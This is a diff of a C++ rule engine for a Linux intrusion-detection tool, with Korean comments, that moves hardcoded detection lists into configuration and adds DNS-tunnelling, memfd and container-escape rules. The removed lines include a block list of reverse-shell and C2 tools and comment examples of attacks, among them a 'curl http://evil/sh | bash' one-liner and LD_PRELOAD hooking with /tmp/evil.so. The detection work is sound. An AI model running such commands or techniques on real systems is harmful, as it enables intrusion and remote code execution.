@@ -4,7 +4,7 @@
  * ┌─ 룰 매칭 흐름 ─────────────────────────────────────────────────────────┐
  * │                                                                         │
  * │  커널 이벤트                                                            │
- * │  (process_event / file_event / net_event)                              │
+ * │  (process_event / file_event / net_event / ...)                        │
  * │          │                                                              │
  * │          ▼                                                              │
  * │  match_rules(e) : 이벤트 타입에 맞는 룰 테이블 순차 검사               │
@@ -18,12 +18,11 @@
  * │                                                                         │
  * └─────────────────────────────────────────────────────────────────────────┘
  *
- * 확장 방향:
- *   - 룰을 JSON 파일로 외부화: nlohmann/json 또는 simdjson 파싱 추가
- *   - 정규식 매칭: std::regex (성능 민감하면 re2 라이브러리)
- *   - 화이트리스트: known-good 프로세스/경로 목록으로 FP 억제
+ * 룰 목록(벡터)은 init_rules(cfg) 로 외부 YAML 또는 내장 기본값으로 초기화된다.
+ * init_rules() 를 호출하지 않으면 모든 목록이 비어 탐지가 동작하지 않는다.
  */
 #include "rules/rule_engine.h"
+#include "rules/rule_config.h"
 #include <algorithm>    /* std::remove_if */
 #include <arpa/inet.h>  /* ntohs() */
 #include <cstring>
@@ -54,220 +53,86 @@ static const char *get_argv_n(const char *buf, __u32 n)
     return (off < MAX_ARGV_LEN) ? buf + off : nullptr;
 }
 
-/* null-terminated 문자열 배열에서 comm 검색 (exact match) */
-static bool comm_in(const char *comm, const char * const *list)
+/* std::vector<std::string> 에서 comm 검색 (exact match) */
+static bool comm_in(const char *comm, const std::vector<std::string> &list)
 {
-    for (; *list; ++list)
-        if (strcmp(comm, *list) == 0) return true;
+    for (const auto &s : list)
+        if (strcmp(comm, s.c_str()) == 0) return true;
     return false;
 }
 
-/* null-terminated prefix 배열 중 하나로 시작하는지 검사 */
-static bool path_has_prefix(const char *path, const char * const *list)
+/* std::vector<std::string> 중 하나로 시작하는지 검사 */
+static bool path_has_prefix(const char *path, const std::vector<std::string> &list)
 {
-    for (; *list; ++list)
-        if (starts_with(path, *list)) return true;
+    for (const auto &s : list)
+        if (starts_with(path, s.c_str())) return true;
     return false;
 }
 
 /*
- * null-terminated 포트 배열에서 port 검색.
+ * std::vector<uint16_t> 에서 port 검색.
  * port 는 이미 호스트 바이트 오더(ntohs 변환 후)여야 한다.
  */
-static bool port_in(uint16_t port, const uint16_t *list)
+static bool port_in(uint16_t port, const std::vector<uint16_t> &list)
 {
-    for (; *list; ++list)
-        if (*list == port) return true;
+    for (uint16_t p : list)
+        if (p == port) return true;
     return false;
 }
 
-/* ── 룰 데이터베이스 ────────────────────────────────────────────────────── */
+/* ── 룰 데이터베이스 (벡터) ─────────────────────────────────────────────── */
 
 /*
- * R-001 기준: 공격자가 지속성(Persistence)을 위해 수정하는 전형적 경로.
- * /etc/cron*, /etc/passwd, /etc/shadow, /etc/ld.so.preload 등.
+ * 모든 목록은 init_rules() 에서 채워진다.
+ * 선언만 해두고 초기화는 하지 않는다 → 빈 벡터 = "탐지 없음" (안전한 기본 상태).
  */
-static const char *SENSITIVE_PATHS[] = {
-    "/etc/", "/boot/", "/bin/", "/sbin/",
-    "/usr/bin/", "/usr/sbin/",
-    "/lib/", "/lib64/", "/usr/lib/",
-    nullptr
-};
+static std::vector<std::string> SENSITIVE_PATHS;
+static std::vector<std::string> LOG_PATHS;
+static std::vector<std::string> TMP_EXEC_PATHS;
+static std::vector<std::string> SHELL_TOOLS;
+static std::vector<std::string> INTERPRETERS;
+static std::vector<std::string> SHELLS;
+static std::vector<std::string> WEB_SERVERS;
+static std::vector<std::string> DB_SERVERS;
+static std::vector<std::string> PKG_MANAGER_COMMS;
+static std::vector<uint16_t>    COMMON_PORTS;
 
-/* R-002: 공격자가 증거 인멸을 위해 지우는 경로 */
-static const char *LOG_PATHS[] = {
-    "/var/log/",
-    "/run/log/",
-    nullptr
-};
+/* ── 화이트리스트 벡터 ──────────────────────────────────────────────────── */
 
-/* R-003: 메모리에서 실행된 드로퍼가 /tmp 에 쓰고 실행하는 패턴 */
-static const char *TMP_EXEC_PATHS[] = {
-    "/tmp/", "/dev/shm/", "/run/shm/", "/var/tmp/",
-    nullptr
-};
+static std::vector<std::string> BIND_WHITELIST;
+static std::vector<std::string> SYS_WRITE_WHITELIST;
+static std::vector<std::string> OUTBOUND_WHITELIST;
+static std::vector<std::string> SETUID_WHITELIST;
+static std::vector<std::string> PTRACE_WHITELIST;
+static std::vector<std::string> MEMFD_WHITELIST;
+static std::vector<std::string> DNS_WHITELIST;
+static std::vector<std::string> NS_ESCAPE_WHITELIST;
+static std::vector<std::string> ABUSED_TLDS;
 
-/*
- * R-004: 공격자가 자주 쓰는 리버스셸/C2/정찰 도구.
- * basename 만 비교하므로 /usr/bin/nc 와 nc 모두 매칭.
- */
-static const char *SHELL_TOOLS[] = {
-    "nc", "ncat", "netcat", "socat",
-    "nmap", "masscan",
-    "msfconsole", "msfvenom",
-    "empire", "covenant",
-    nullptr
-};
+/* ── 룰 초기화 ─────────────────────────────────────────────────────────── */
 
-/*
- * R-005: 스크립트 인터프리터 직접 실행.
- * 정상적인 환경에서는 스크립트 파일을 인자로 받지만,
- * 공격자는 종종 -c 'exec(...)' 형태로 인라인 페이로드를 실행한다.
- * → sys_enter_execve 의 argv 파싱은 마일스톤 5+ 에서 추가.
- */
-static const char *INTERPRETERS[] = {
-    "python", "python2", "python3",
-    "perl", "ruby", "php", "lua",
-    "node", "nodejs",
-    nullptr
-};
-
-/*
- * R-006: 정상 트래픽에서 흔한 포트. 이 외의 포트로의 연결은 의심.
- * 실제 환경에서는 조직의 허용 포트 목록으로 대체해야 한다.
- * 마지막 0 은 sentinel (배열 끝 표시).
- */
-static const uint16_t COMMON_PORTS[] = {
-    /* 표준 프로토콜 */
-    21, 22, 25, 53, 80, 110, 143,
-    443, 465, 587, 993, 995,
-    /* 데이터베이스 */
-    1433,              /* MSSQL          */
-    3306, 5432,        /* MySQL, Postgres */
-    6379, 27017,       /* Redis, MongoDB  */
-    /* 웹/API */
-    8080, 8443, 8888, 9200,
-    /* 개발 서버 (React/Vue/Flask/FastAPI 등) */
-    3000, 4200, 5000, 5173, 8000,
-    /* 모니터링·오케스트레이션 */
-    9090, 9100,        /* Prometheus, node_exporter */
-    6443, 10250,       /* Kubernetes API, kubelet   */
-    2375, 2376,        /* Docker daemon             */
-    0  /* sentinel */
-};
-
-/* ── 화이트리스트 ────────────────────────────────────────────────────────── */
-
-/*
- * R-007 화이트리스트: 합법적으로 포트를 바인드하는 알려진 시스템/서버 프로세스.
- *
- * 이 목록에 있는 프로세스의 bind() 는 R-007 에서 제외한다.
- * 웹 서버(nginx 등)와 DB(mysqld 등)는 R-011/R-012 에서 더 정교하게 탐지하므로
- * R-007(low) 중복 발화를 막는다.
- *
- * comm 은 task_struct.comm 으로 최대 15자이므로 긴 이름은 잘린다:
- *   NetworkManager  → "NetworkManage"   (15자)
- *   systemd-resolve → "systemd-resolve" (15자)
- *   containerd-shim → "containerd-shi"  (15자)
- */
-static const char *BIND_WHITELIST[] = {
-    /* 시스템 데몬 */
-    "systemd", "systemd-resolve", "dbus-daemon",
-    "NetworkManage",   /* NetworkManager */
-    "avahi-daemon", "cupsd", "cups-browsed",
-    "rsyslogd", "journald", "snapd",
-    /* 원격 접속 */
-    "sshd",
-    /* 컨테이너/가상화 */
-    "dockerd", "containerd", "containerd-shi",
-    "libvirtd", "virtlogd",
-    /* 웹 서버 (R-011 으로 충분히 커버) */
-    "nginx", "apache", "apache2", "httpd", "lighttpd",
-    "gunicorn", "uwsgi", "php-fpm",
-    /* DB 서버 (R-012 으로 충분히 커버) */
-    "mysqld", "mysqld_safe", "mariadbd",
-    "postgres", "postmaster",
-    "mongod", "redis-server", "memcached",
-    nullptr
-};
-
-/*
- * R-001 화이트리스트: 패키지 관리자·인스톨러가 시스템 경로에 쓰는 것은 정상.
- *
- * apt/dpkg 가 /usr/bin, /lib 등에 파일을 설치하거나
- * update-alternatives 가 심볼릭 링크를 갱신하는 동작을 FP 로 처리한다.
- *
- * comm 15자 한도:
- *   update-alternatives → "update-alterna"
- *   dpkg-preconfigure  → "dpkg-preconfig"
- */
-static const char *SYS_WRITE_WHITELIST[] = {
-    "dpkg", "dpkg-unpack", "dpkg-preconfig",
-    "apt", "apt-get",
-    "update-alterna",  /* update-alternatives */
-    "rpm", "yum", "dnf", "zypper",
-    "snap", "snapd",
-    nullptr
-};
-
-/*
- * R-006 화이트리스트: 비표준 포트를 사용하는 것이 정상인 시스템 도구.
- *
- * curl/wget: 사용자가 명시적으로 지정한 포트로 요청 (테스트, API 호출)
- * apt/apt-get: 비표준 포트의 사설 미러 접속
- * git: HTTP/HTTPS 이외의 포트 사용 (기업 내부 Gitea 등)
- * snap: Snap Store 내부 API
- */
-static const char *OUTBOUND_WHITELIST[] = {
-    "apt", "apt-get", "apt-transport",
-    "curl", "wget",
-    "git", "git-remote-http",
-    "snap", "snapd",
-    nullptr
-};
-
-/*
- * R-005/R-008 부모 화이트리스트: 패키지 관리자·빌드 도구가 인터프리터를
- * 실행하는 경우는 정상적인 설치/빌드 동작이다.
- *
- * 예:
- *   apt-get install python3-foo  → python3 포스트인스톨 스크립트 실행
- *   pip install xxx              → setup.py 실행 (python3 호출)
- *   make install                 → Makefile 내부에서 python3 호출
- */
-/*
- * R-015 화이트리스트: 알려진 setuid 바이너리.
- * 이 목록 외의 프로세스가 uid≠euid 로 실행되면 의심.
- */
-static const char *SETUID_WHITELIST[] = {
-    "sudo", "su", "newgrp", "passwd", "chsh", "chfn", "chage", "gpasswd",
-    "ping", "ping6", "traceroute6",
-    "pkexec",
-    "crontab", "at",
-    "mount", "umount", "fusermount", "fusermount3",
-    "ssh", "ssh-agent",
-    nullptr
-};
-
-/*
- * R-014 화이트리스트: 합법적인 디버거/프로파일러.
- * 이 목록의 프로세스가 PTRACE_ATTACH 해도 발화하지 않는다.
- */
-static const char *PTRACE_WHITELIST[] = {
-    "gdb", "lldb", "strace", "ltrace",
-    "perf", "valgrind", "rr",
-    nullptr
-};
-
-static const char *PKG_MANAGER_COMMS[] = {
-    "apt", "apt-get", "dpkg", "dpkg-preconfig",
-    "pip", "pip3",
-    "npm", "yarn", "pnpm",
-    "cargo", "rustc",
-    "make", "cmake", "ninja",
-    "gradle", "mvn",
-    nullptr
-};
+void init_rules(const RuleConfig &cfg)
+{
+    SENSITIVE_PATHS     = cfg.sensitive_paths;
+    LOG_PATHS           = cfg.log_paths;
+    TMP_EXEC_PATHS      = cfg.tmp_exec_paths;
+    SHELL_TOOLS         = cfg.shell_tools;
+    INTERPRETERS        = cfg.interpreters;
+    SHELLS              = cfg.shells;
+    WEB_SERVERS         = cfg.web_servers;
+    DB_SERVERS          = cfg.db_servers;
+    PKG_MANAGER_COMMS   = cfg.pkg_manager_comms;
+    COMMON_PORTS        = cfg.common_ports;
+    BIND_WHITELIST      = cfg.bind_whitelist;
+    SYS_WRITE_WHITELIST = cfg.sys_write_whitelist;
+    OUTBOUND_WHITELIST  = cfg.outbound_whitelist;
+    SETUID_WHITELIST    = cfg.setuid_whitelist;
+    PTRACE_WHITELIST    = cfg.ptrace_whitelist;
+    MEMFD_WHITELIST     = cfg.memfd_whitelist;
+    DNS_WHITELIST       = cfg.dns_whitelist;
+    NS_ESCAPE_WHITELIST = cfg.ns_escape_whitelist;
+    ABUSED_TLDS         = cfg.abused_tlds;
+}
 
 /* ── 이벤트별 룰 매칭 구현 ──────────────────────────────────────────────── */
 
@@ -297,10 +162,6 @@ std::vector<RuleMatch> match_rules(const process_event &e)
      * LD_PRELOAD 는 동적 링커가 다른 공유 라이브러리보다 먼저 지정된 .so 를 로드한다.
      * 공격자는 이를 이용해 libc 함수(open, read, readdir 등)를 후킹하거나
      * 정상 바이너리 실행 시 악성 코드를 함께 실행한다.
-     *
-     * 예:
-     *   LD_PRELOAD=/tmp/evil.so /bin/ls   → ls 실행 전 evil.so 로드
-     *   LD_PRELOAD=/dev/shm/hook.so bash  → bash의 libc 함수 후킹
      */
     if (e.has_ld_preload)
         hits.push_back({"R-013", "LD_PRELOAD 환경변수 인젝션 의심", "high"});
@@ -310,11 +171,6 @@ std::vector<RuleMatch> match_rules(const process_event &e)
      *
      * uid(real) ≠ euid(effective) 이면 setuid 비트가 설정된 바이너리다.
      * 알려진 정상 setuid 바이너리(sudo, ping 등)는 화이트리스트로 제외.
-     * 예상치 못한 경로(/tmp, /home 등)의 setuid 실행이 특히 위험.
-     *
-     * TOCTOU 공격 시나리오:
-     *   1) /tmp/evil 에 setuid root 바이너리 쓰기 (R-001 트리거)
-     *   2) /tmp/evil 실행 → R-003 + R-015 동시 트리거 → 높은 신뢰도
      */
     if (e.uid != e.euid && !comm_in(e.comm, SETUID_WHITELIST))
         hits.push_back({"R-015", "예상치 못한 setuid 실행 (권한 상승 의심)", "critical"});
@@ -322,14 +178,8 @@ std::vector<RuleMatch> match_rules(const process_event &e)
     /*
      * R-010: 인터프리터 + -c 플래그 (인라인 페이로드 실행).
      *
-     * 공격 패턴:
-     *   python3 -c "import os; os.system('curl http://evil/sh | bash')"
-     *   perl -e 'use Socket; ...'   # 리버스셸 원라이너
-     *   node -e 'require("child_process").exec(...)'
-     *
-     * -c / -e 플래그는 인터프리터가 스크립트 파일 없이 인라인 코드를 실행하게 하므로
-     * 파일리스(fileless) 공격의 핵심 지표다.
-     * argv[1] (comm 다음 첫 인자)에서 이를 감지한다.
+     * python3 -c "import os; ..." / perl -e '...' 패턴.
+     * 파일리스(fileless) 공격의 핵심 지표.
      */
     if (comm_in(e.comm, INTERPRETERS) && e.argc >= 2) {
         const char *arg1 = get_argv_n(e.argv, 1);
@@ -363,9 +213,7 @@ std::vector<RuleMatch> match_rules(const file_event &e)
     if (e.type == EVENT_FILE_RENAME) {
         /*
          * R-009: /tmp 에서 시스템 경로로 rename.
-         * TOCTOU + rename 원자성을 악용한 권한 상승 기법:
-         *   1) /tmp/evil 에 악성 파일 생성
-         *   2) renameat2(RENAME_EXCHANGE) 로 /usr/bin/sudo 와 원자 교체
+         * TOCTOU + rename 원자성을 악용한 권한 상승 기법.
          */
         if (path_has_prefix(e.path, TMP_EXEC_PATHS) &&
             path_has_prefix(e.path2, SENSITIVE_PATHS))
@@ -394,8 +242,6 @@ std::vector<RuleMatch> match_rules(const net_event &e)
         /*
          * R-007: 서버 포트 바인드 (백도어 리스너 의심).
          * BIND_WHITELIST: 합법적인 서버 프로세스(sshd, nginx, mysqld 등) 제외.
-         * 웹·DB 서버는 R-011/R-012 에서 더 정교하게 탐지되므로
-         * R-007(low) 중복 발화를 막는다.
          */
         if (!comm_in(e.comm, BIND_WHITELIST))
             hits.push_back({"R-007", "서버 포트 바인드 (알 수 없는 프로세스)", "low"});
@@ -405,38 +251,6 @@ std::vector<RuleMatch> match_rules(const net_event &e)
 }
 
 /* ── 프로세스 트리 기반 룰 ──────────────────────────────────────────────── */
-
-/*
- * 웹 서버: HTTP 요청을 받아 처리하는 서비스.
- * 이 목록의 프로세스가 셸/인터프리터를 직접 exec() 하면 웹셸 실행으로 판단.
- * MITRE ATT&CK T1190 (Exploit Public-Facing Application) + T1059.
- */
-static const char *WEB_SERVERS[] = {
-    "nginx", "apache", "apache2", "httpd", "lighttpd",
-    "caddy", "traefik", "gunicorn", "uwsgi", "php-fpm",
-    nullptr
-};
-
-/*
- * DB 서버: SQL/NoSQL 데이터베이스 데몬.
- * 셸을 직접 spawn 하는 경우는 SQL injection → OS command execution 의심.
- * MITRE ATT&CK T1190 + T1059.
- */
-static const char *DB_SERVERS[] = {
-    "mysqld", "mysqld_safe", "mariadbd",
-    "postgres", "postmaster",
-    "mongod", "redis-server", "memcached",
-    nullptr
-};
-
-/*
- * 유닉스 셸: 인터랙티브/스크립트 실행 셸.
- * 서비스 데몬이 이 목록을 직접 exec() 하면 명령 실행(RCE) 의심.
- */
-static const char *SHELLS[] = {
-    "bash", "sh", "dash", "zsh", "ksh", "fish", "tcsh", "csh",
-    nullptr
-};
 
 std::vector<RuleMatch> match_rules(const process_event &e, const char *parent_comm)
 {
@@ -448,10 +262,6 @@ std::vector<RuleMatch> match_rules(const process_event &e, const char *parent_co
      *
      * apt install python3-package → postinst 스크립트에서 python3 호출
      * pip install xxx             → setup.py 빌드 중 python3 호출
-     * make install                → Makefile 에서 python3 호출
-     *
-     * 이 경우 R-005(medium)/R-008(critical) 이 FP로 발화한다.
-     * std::remove_if 로 해당 룰을 hits 에서 제거한다.
      */
     if (parent_comm && comm_in(parent_comm, PKG_MANAGER_COMMS)) {
         hits.erase(
@@ -471,21 +281,14 @@ std::vector<RuleMatch> match_rules(const process_event &e, const char *parent_co
 
     /*
      * R-011: 웹 서버 자식 프로세스가 셸 또는 인터프리터를 실행.
-     *
-     * 정상 경로: nginx worker → [요청 처리] (fork/exec 없음)
-     * 이상 경로: nginx → bash  ← 웹셸이 system() / proc_open() 호출
-     *
-     * PHP-FPM 이 php 스크립트를 exec() 하는 것은 정상이지만,
-     * php-fpm → bash 는 비정상이다.
+     * nginx → bash  ← 웹셸이 system() / proc_open() 호출
      */
     if (comm_in(parent_comm, WEB_SERVERS) && (child_is_shell || child_is_interp))
         hits.push_back({"R-011", "웹 서버 자식 셸 실행 (웹셸/RCE 의심)", "critical"});
 
     /*
      * R-012: DB 서버 자식 프로세스가 셸 또는 인터프리터를 실행.
-     *
-     * mysqld → bash : SQL injection + INTO OUTFILE + xp_cmdshell 유사 패턴
-     * postgres → sh : COPY TO PROGRAM 을 통한 OS 명령 실행 (CVE-2019-9193 류)
+     * postgres → sh : COPY TO PROGRAM 을 통한 OS 명령 실행
      */
     if (comm_in(parent_comm, DB_SERVERS) && (child_is_shell || child_is_interp))
         hits.push_back({"R-012", "DB 서버 자식 셸 실행 (SQLi RCE 의심)", "critical"});
@@ -499,14 +302,6 @@ std::vector<RuleMatch> match_rules(const ptrace_event &e)
 
     /*
      * R-014: ptrace ATTACH - 프로세스 추적/인젝션 시도.
-     *
-     * PTRACE_ATTACH: 실행 중인 프로세스를 일시 정지하고 메모리/레지스터 접근.
-     * PTRACE_SEIZE:  SIGSTOP 없이 attach (더 은밀한 방식, 리눅스 3.4+).
-     *
-     * 공격 시나리오:
-     *   - 자격증명 탈취: sshd/sudo 메모리에서 비밀번호 읽기
-     *   - 코드 인젝션: PTRACE_POKEDATA 로 쉘코드 삽입
-     *   - 프로세스 하이재킹: 실행 흐름 변경
      *
      * 합법적 사용(gdb, strace 등)은 PTRACE_WHITELIST 로 억제.
      */
@@ -525,9 +320,182 @@ std::vector<RuleMatch> match_rules(const memory_event &e)
      * PROT_EXEC(4) 와 PROT_WRITE(2) 가 동시에 설정된 메모리는
      * 쉘코드 삽입(JIT 스프레이 등)에 주로 사용된다.
      */
-    if ((e.prot & 6) == 6) { // PROT_WRITE | PROT_EXEC
+    if ((e.prot & 6) == 6)
         hits.push_back({"R-016", "RWX 메모리 할당 (JIT/쉘코드 의심)", "high"});
+
+    return hits;
+}
+
+std::vector<RuleMatch> match_rules(const memfd_event &e)
+{
+    std::vector<RuleMatch> hits;
+
+    if (comm_in(e.comm, MEMFD_WHITELIST))
+        return hits; /* 알려진 JIT 런타임·시스템 소프트웨어 → 제외 */
+
+    /*
+     * R-017: memfd_create() 파일리스 공격 패턴.
+     *
+     * MFD_ALLOW_SEALING(0x2): 기록 후 메모리를 불변으로 밀봉 → 셸코드 완성 지표.
+     * 이름이 빈 문자열(""): 추적 회피 의도.
+     */
+    bool sealing    = (e.flags & 0x2) != 0;
+    bool empty_name = (e.name[0] == '\0');
+
+    if (sealing || empty_name)
+        hits.push_back({"R-017", "memfd_create 파일리스 실행 (셸코드 드로퍼 의심)", "critical"});
+    else
+        hits.push_back({"R-017", "memfd_create 익명 파일 생성 (파일리스 의심)", "high"});
+
+    return hits;
+}
+
+/* ── DNS 룰 ─────────────────────────────────────────────────────────────── */
+
+/*
+ * max_label_len(): 도메인명의 레이블 중 가장 긴 것의 길이 반환.
+ * DNS 터널링은 레이블 내에 데이터를 인코딩하므로 레이블 단위로 검사.
+ */
+static size_t max_label_len(const char *name)
+{
+    size_t max_len = 0, cur_len = 0;
+    for (const char *p = name; *p; ++p) {
+        if (*p == '.') {
+            if (cur_len > max_len) max_len = cur_len;
+            cur_len = 0;
+        } else {
+            cur_len++;
+        }
     }
+    if (cur_len > max_len) max_len = cur_len;
+    return max_len;
+}
+
+/*
+ * vowel_ratio(): 알파벳 중 모음(aeiou) 비율 반환 (0.0~1.0).
+ *
+ * DGA 도메인 휴리스틱: 정상 영어 단어의 모음 비율은 약 0.38.
+ * DGA 생성 랜덤 문자열은 모음이 거의 없다 (ratio < 0.15).
+ */
+static float vowel_ratio(const char *name)
+{
+    int alpha = 0, vowels = 0;
+    for (const char *p = name; *p && *p != '.'; ++p) {
+        char c = *p | 0x20; /* 소문자 변환 */
+        if (c >= 'a' && c <= 'z') {
+            alpha++;
+            if (c=='a'||c=='e'||c=='i'||c=='o'||c=='u') vowels++;
+        }
+    }
+    return (alpha > 0) ? (float)vowels / alpha : 0.5f;
+}
+
+/*
+ * ends_with_abused_tld(): 도메인명이 남용 TLD 중 하나로 끝나는지 확인.
+ */
+static bool ends_with_abused_tld(const char *name)
+{
+    size_t nlen = strlen(name);
+    for (const auto &tld : ABUSED_TLDS) {
+        size_t tlen = tld.size();
+        if (nlen >= tlen && strcmp(name + nlen - tlen, tld.c_str()) == 0)
+            return true;
+    }
+    return false;
+}
+
+/*
+ * first_label_len(): 도메인의 첫 번째 레이블(서브도메인) 길이.
+ */
+static size_t first_label_len(const char *name)
+{
+    const char *dot = strchr(name, '.');
+    return dot ? (size_t)(dot - name) : strlen(name);
+}
+
+std::vector<RuleMatch> match_rules(const dns_event &e)
+{
+    std::vector<RuleMatch> hits;
+
+    if (comm_in(e.comm, DNS_WHITELIST)) return hits;
+
+    const char *name = e.name;
+    if (!name[0]) return hits;
+
+    /*
+     * R-018a: DNS 터널링 (레이블 길이 > 50자).
+     * iodine, dnscat2 등이 Base32/Base64 인코딩 데이터를 서브도메인에 삽입.
+     */
+    if (max_label_len(name) > 50)
+        hits.push_back({"R-018a", "DNS 터널링 의심 (레이블 > 50자)", "critical"});
+
+    /*
+     * R-018b: DGA 도메인 의심 (랜덤 서브도메인).
+     * 첫 번째 레이블이 15자 초과 AND 모음 비율 < 0.15.
+     */
+    size_t fl = first_label_len(name);
+    if (fl > 15 && vowel_ratio(name) < 0.15f)
+        hits.push_back({"R-018b", "DGA 도메인 의심 (랜덤 서브도메인)", "high"});
+
+    /*
+     * R-018c: 남용 TLD 접속.
+     * .tk/.ml/.ga/.cf/.gq (Freenom 무료 TLD) 등은 피싱/C2 서버에 많이 쓰인다.
+     */
+    if (ends_with_abused_tld(name))
+        hits.push_back({"R-018c", "남용 TLD 접속 (.tk/.ml/.ga 등)", "medium"});
+
+    return hits;
+}
+
+/* ── 네임스페이스 룰 ─────────────────────────────────────────────────────── */
+
+/* CLONE_NEW* 플래그 상수 (userspace 헤더에서 공급) */
+#include <sched.h>
+
+std::vector<RuleMatch> match_rules(const ns_event &e)
+{
+    std::vector<RuleMatch> hits;
+
+    if (comm_in(e.comm, NS_ESCAPE_WHITELIST)) return hits;
+
+    /*
+     * R-024: 컨테이너 탈출 시도.
+     *
+     * 공격 시나리오:
+     *   컨테이너 내부에서 unshare(CLONE_NEWUSER | CLONE_NEWNS) 를 호출해
+     *   새 사용자 네임스페이스에서 root 권한을 획득한 뒤,
+     *   호스트 파일시스템 마운트 → 호스트 탈출 (CVE-2019-5736 류).
+     *
+     * in_container=1 + CLONE_NEWUSER: 컨테이너 내에서 새 user ns → 확실한 탈출 시도
+     * in_container=1 + 복수 NS 플래그: 네임스페이스 전반 분리 → 탈출 준비
+     * in_container=0 + CLONE_NEWUSER: 호스트에서의 권한 상승 시도 (덜 위험하지만 의심)
+     */
+    bool has_newuser = (e.flags & CLONE_NEWUSER) != 0;
+    bool has_newpid  = (e.flags & CLONE_NEWPID)  != 0;
+    bool has_newns   = (e.flags & CLONE_NEWNS)   != 0;
+
+    /* 설정된 NS 플래그 수 계산 */
+    int ns_count = 0;
+    if (e.flags & CLONE_NEWUSER)   ns_count++;
+    if (e.flags & CLONE_NEWPID)    ns_count++;
+    if (e.flags & CLONE_NEWNS)     ns_count++;
+    if (e.flags & CLONE_NEWNET)    ns_count++;
+    if (e.flags & CLONE_NEWIPC)    ns_count++;
+    if (e.flags & CLONE_NEWUTS)    ns_count++;
+    if (e.flags & CLONE_NEWCGROUP) ns_count++;
+
+    if (e.in_container && has_newuser)
+        hits.push_back({"R-024",
+                        "컨테이너 탈출 시도: 컨테이너 내 사용자 네임스페이스 분리",
+                        "critical"});
+    else if (e.in_container && ns_count >= 2)
+        hits.push_back({"R-024",
+                        "컨테이너 탈출 의심: 복수 네임스페이스 동시 분리",
+                        "high"});
+    else if (has_newuser && (has_newpid || has_newns))
+        hits.push_back({"R-024",
+                        "사용자 네임스페이스 + mount/pid 분리 (권한 상승 의심)",
+                        "medium"});
 
     return hits;
 }
